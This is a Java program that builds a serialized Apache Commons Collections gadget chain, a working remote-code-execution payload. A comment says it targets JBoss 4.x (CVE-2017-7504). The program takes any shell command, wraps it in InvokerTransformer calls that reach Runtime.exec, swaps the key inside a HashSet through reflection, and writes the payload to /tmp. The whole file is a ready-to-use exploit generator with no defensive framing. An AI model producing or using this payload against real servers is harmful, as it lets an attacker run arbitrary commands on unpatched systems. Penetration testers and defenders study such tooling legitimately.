import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

// Used https://github.com/joaomatosf/JavaDeserH2HC as reference so big credit to joaomatosf.
// JBOss 4.x (CVE-2017-7504)

public class SerializePayload
{
    @SuppressWarnings ( {"unchecked"} )
    public static void main(String[] args)
            throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException, NoSuchFieldException {

        if (args.length != 1) {
            System.out.println("Usage: serialize_payload.jar '<command>'");
            System.exit(1);
        }

        boolean isUnix = !args[0].contains("cmd.exe") && !args[0].contains("powershell.exe");
        String cmd[];
        if (isUnix)
            cmd = new String[]{"/bin/bash", "-c", args[0]};
        else
            cmd = new String[]{"cmd.exe", "/c", args[0]};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        ( new Class[] {String.class, Class[].class } ),
                        ( new Object[] {"getRuntime", new Class[0] } )
                ),

                new InvokerTransformer(
                        "invoke",
                        (new Class[] {Object.class, Object[].class }),
                        (new Object[] {null, new Object[0] })
                ),

                new InvokerTransformer(
                        "exec",
                        new Class[] { String[].class },
                        new Object[]{ cmd } )
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map map1 = new HashMap();
        Map lazyMap = LazyMap.decorate(map1,transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node, entry);

        System.out.println("Saving serialized object in serialize_payload.ser");
        FileOutputStream fos = new FileOutputStream("/tmp/serialize_payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(map);
        oos.flush();
    }
}
